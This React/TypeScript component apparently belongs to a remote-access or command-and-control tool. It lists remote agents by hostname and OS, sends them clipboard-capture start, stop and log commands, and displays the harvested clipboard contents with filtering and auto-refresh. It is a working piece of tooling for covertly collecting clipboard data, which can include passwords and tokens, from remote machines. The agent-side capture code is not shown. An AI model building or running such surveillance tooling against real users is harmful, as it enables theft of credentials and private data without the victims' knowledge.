import { useState, useEffect } from 'react'
import axios from 'axios'

interface Agent {
  agent_id: string
  hostname: string
  os: string
}

interface ClipboardEntry {
  timestamp: string
  content: string
}

const ClipboardMonitor = () => {
  const [agents, setAgents] = useState<Agent[]>([])
  const [selectedAgent, setSelectedAgent] = useState('')
  const [entries, setEntries] = useState<ClipboardEntry[]>([])
  const [monitoring, setMonitoring] = useState(false)
  const [loading, setLoading] = useState(false)
  const [error, setError] = useState('')
  const [filter, setFilter] = useState('')
  const [autoRefresh, setAutoRefresh] = useState(false)

  useEffect(() => {
    axios.get('/api/live/agents').then(res => {
      const agentsObj = res.data.agents || res.data
      const list = Object.entries(agentsObj).map(([id, info]: [string, any]) => ({
        agent_id: id, hostname: info.hostname || 'Unknown', os: info.os || 'Unknown',
      }))
      setAgents(list)
      if (list.length > 0) setSelectedAgent(list[0].agent_id)
    }).catch(() => {})
  }, [])

  useEffect(() => {
    if (!autoRefresh || !selectedAgent) return
    const interval = setInterval(fetchLogs, 5000)
    return () => clearInterval(interval)
  }, [autoRefresh, selectedAgent])

  const sendCommand = async (cmd: any): Promise<string> => {
    const res = await axios.post(`/api/live/agents/${selectedAgent}/command`, cmd)
    const cmdId = res.data?.cmd_id
    for (let i = 0; i < 30; i++) {
      await new Promise(r => setTimeout(r, 1000))
      const poll = await axios.get(`/api/live/agents/${selectedAgent}/result/${cmdId}`)
      if (poll.data?.status && poll.data.status !== 'pending') {
        if (poll.data.status === 'error') throw new Error(poll.data.error || 'Failed')
        return poll.data.output || ''
      }
    }
    throw new Error('Timeout')
  }

  const startMonitoring = async () => {
    setLoading(true)
    setError('')
    try {
      await sendCommand({ type: 'clipboard_start' })
      setMonitoring(true)
    } catch (e: any) { setError(e.message) }
    setLoading(false)
  }

  const stopMonitoring = async () => {
    setLoading(true)
    setError('')
    try {
      await sendCommand({ type: 'clipboard_stop' })
      setMonitoring(false)
      setAutoRefresh(false)
    } catch (e: any) { setError(e.message) }
    setLoading(false)
  }

  const fetchLogs = async () => {
    if (!selectedAgent) return
    try {
      const output = await sendCommand({ type: 'clipboard_logs' })
      const parsed = JSON.parse(output)
      if (Array.isArray(parsed)) {
        setEntries(parsed)
      }
    } catch { /* ignore polling errors */ }
  }

  const filtered = entries.filter(e =>
    e.content.toLowerCase().includes(filter.toLowerCase())
  )

  return (
    <div className="space-y-6">
      <div className="flex items-center justify-between">
        <h1 className="text-2xl font-bold text-white">Clipboard Monitor</h1>
        <div className="flex gap-3 items-center">
          <select
            value={selectedAgent}
            onChange={e => setSelectedAgent(e.target.value)}
            className="bg-gray-800 text-white border border-gray-600 rounded px-3 py-2"
          >
            {agents.map(a => (
              <option key={a.agent_id} value={a.agent_id}>{a.hostname} ({a.os})</option>
            ))}
          </select>
          {!monitoring ? (
            <button
              onClick={startMonitoring}
              disabled={loading || !selectedAgent}
              className="bg-green-600 hover:bg-green-700 text-white px-4 py-2 rounded disabled:opacity-50"
            >
              Start Capture
            </button>
          ) : (
            <button
              onClick={stopMonitoring}
              disabled={loading}
              className="bg-red-600 hover:bg-red-700 text-white px-4 py-2 rounded disabled:opacity-50"
            >
              Stop Capture
            </button>
          )}
        </div>
      </div>

      {error && <div className="bg-red-900/30 border border-red-700 text-red-400 p-3 rounded">{error}</div>}

      {/* Controls */}
      <div className="flex gap-4 items-center">
        <button
          onClick={fetchLogs}
          disabled={!selectedAgent}
          className="bg-blue-600 hover:bg-blue-700 text-white px-4 py-2 rounded"
        >
          Fetch Logs
        </button>
        <label className="flex items-center gap-2 text-gray-300">
          <input
            type="checkbox"
            checked={autoRefresh}
            onChange={e => setAutoRefresh(e.target.checked)}
            className="rounded"
          />
          Auto-refresh (5s)
        </label>
        <input
          type="text"
          placeholder="Filter clipboard content..."
          value={filter}
          onChange={e => setFilter(e.target.value)}
          className="flex-1 bg-gray-800 text-white border border-gray-600 rounded px-3 py-2"
        />
        <span className="text-gray-400 text-sm">{filtered.length} entries</span>
      </div>

      {/* Status */}
      <div className="flex items-center gap-2">
        <span className={`w-3 h-3 rounded-full ${monitoring ? 'bg-green-500 animate-pulse' : 'bg-gray-600'}`}></span>
        <span className="text-gray-300">{monitoring ? 'Monitoring active' : 'Not monitoring'}</span>
      </div>

      {/* Clipboard Entries */}
      <div className="space-y-2">
        {filtered.map((entry, i) => (
          <div key={i} className="bg-gray-800 p-4 rounded-lg border border-gray-700">
            <div className="flex items-center justify-between mb-2">
              <span className="text-blue-400 text-sm font-mono">{entry.timestamp}</span>
              <button
                onClick={() => navigator.clipboard.writeText(entry.content)}
                className="text-gray-400 hover:text-white text-xs"
              >
                Copy
              </button>
            </div>
            <pre className="text-gray-200 text-sm whitespace-pre-wrap break-all font-mono bg-gray-900 p-3 rounded">
              {entry.content}
            </pre>
          </div>
        ))}
        {filtered.length === 0 && (
          <div className="text-center py-12 text-gray-500">
            {entries.length === 0
              ? 'No clipboard data captured yet. Start monitoring and fetch logs.'
              : 'No entries match your filter.'}
          </div>
        )}
      </div>
    </div>
  )
}

export default ClipboardMonitor
